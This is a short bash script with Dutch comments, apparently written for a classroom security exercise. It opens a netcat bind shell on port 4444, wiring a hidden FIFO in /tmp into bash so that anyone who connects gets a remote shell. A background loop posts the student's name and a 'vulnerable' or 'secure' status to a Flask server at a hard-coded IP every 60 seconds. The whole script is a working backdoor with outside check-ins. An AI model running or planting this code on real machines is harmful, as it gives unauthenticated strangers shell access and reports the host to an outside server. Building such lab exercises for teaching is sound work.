#!/bin/bash

SERVER_IP="148.100.79.193"  # <- Vervang dit door het IP van je Flask-server
STUDENT_NAAM="$1"
PORT=4444
FIFO="/tmp/.fifo_$PORT"

# Verwijder oude pipe als die bestaat
[ -p "$FIFO" ] && rm -f "$FIFO"

# Maak nieuwe named pipe aan
mkfifo "$FIFO"

# Start shell via FIFO (achtergrond)
bash < "$FIFO" | while true; do nc -lvnp $PORT > "$FIFO"; done &

# Status reporter (elke 60 sec update naar server)
status_reporter() {
  while true; do
    if pgrep -f "nc -lvnp $PORT" > /dev/null; then
      STATUS="vulnerable"
    else
      STATUS="secure"
    fi

    curl -s -X POST http://$SERVER_IP:5000/update \
      -d "student=$STUDENT_NAAM&status=$STATUS" >/dev/null 2>&1

    sleep 60
  done
}

status_reporter &
